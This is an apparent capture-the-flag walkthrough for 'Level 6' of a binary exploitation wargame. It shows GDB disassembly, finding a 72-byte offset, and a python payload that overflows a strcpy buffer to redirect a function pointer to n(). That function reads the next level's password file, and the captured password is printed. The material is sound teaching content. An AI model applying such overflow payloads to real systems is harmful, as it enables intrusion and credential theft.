# 🚀 Level 6 - Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./level6
Segmentation fault (core dumped)
$ ./level6 test
Nope
```
- 🧾 Program segfaults without args, prints "Nope" with input.
- 🔍 Likely involves a function pointer.

## 🐞 Start it in GDB
```bash
(gdb-peda)$ pdisas main
...
0x080484ae <+50>:	mov    DWORD PTR [eax], 0x8048468  ; buf2 = &m
0x080484c5 <+73>:	call   0x80482d0 <strcpy@plt>
0x080484d0 <+84>:	call   DWORD PTR [buf2]
...
```
- 🧠 It allocates 64 bytes (buf1) and 4 bytes (buf2 = function pointer).
- 📥 Then copies user input to buf1 → potential buffer overflow!
- 💥 Finally calls the function pointer → control flow hijack opportunity!

## 🕵️ Investigate Functions
```bash
(gdb-peda)$ info functions
...
0x08048454  n
0x08048468  m
🧨 m() just prints “Nope”.
🎯 n() runs: system("/bin/cat /home/user/level7/.pass")
```
## 🔍 Discover Offset to Function Pointer
```bash
$ python -c 'print("A"*100)' | ./level6
Segmentation fault

(gdb-peda)$ pattern_create 100
(gdb-peda)$ r $(pattern)
(gdb-peda)$ pattern_offset 0x53535353
72
```
- 🧮 Offset to function pointer = 72 bytes

## 🎯 Goal: Overwrite Function Pointer to Call n()
```bash
(gdb-peda)$ p n
$1 = {<text variable, no debug info>} 0x08048454 <n>
```
✅ n() address: 0x08048454

## 🛠 Build the Payload
```bash
$ python -c 'print("A"*72 + "\x54\x84\x04\x08")' | ./level6
```

## ✅ Final Step - Get the Password
```bash
$ (python -c 'print("A"*72 + "\x54\x84\x04\x08")'; cat -) | ./level6
cat ~level7/.pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
🎉 Done.